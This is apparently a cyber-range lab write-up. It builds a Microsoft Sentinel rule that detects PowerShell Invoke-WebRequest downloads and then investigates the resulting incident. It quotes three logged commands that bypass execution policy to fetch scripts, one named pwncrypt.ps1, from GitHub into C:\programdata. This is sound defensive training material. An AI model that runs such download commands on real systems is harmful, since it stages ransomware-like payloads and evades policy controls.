# Overview
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

# Alert Rule
```
let TargetHostname = "ktran-vm";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
| order by TimeGenerated
```

#### Analytics Rule Settings:
- Name: 
- Description: 
- Enable the Rule
- Use ChatGPT to set Mitre ATT&CK Framework Categories based on the query
- Run query every 4 hours
- Lookup data for last 24 hours (can define in query)
- Stop running query after alert is generated == Yes
Configure Entity Mappings:	
- Account |  Identifier: Name, Value: AccountName	
- Host | Identifier: HostName, Value: DeviceName
- Process | Identifier: CommandLine, Value: ProcessCommandLine

- Automatically create an Incident if the rule is triggered
- Group all alerts into a single Incident per 24 hours
- Stop running query after alert is generated (24 hours)

After the alerts creation, awhile later an incident arises.
![incident](/images-sus/incident.png)

I assign the incident to myself and label it active.
![incident assign](/images-sus/incident-assigned.png)

Further investigation reveals 3 entities.
![incident visual](/images-sus/investigate.png)

The entities involved are as follows.
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
Each entity is using Powershell's `Invoke-WebRequest` command to download a script from an external site (Github).

 
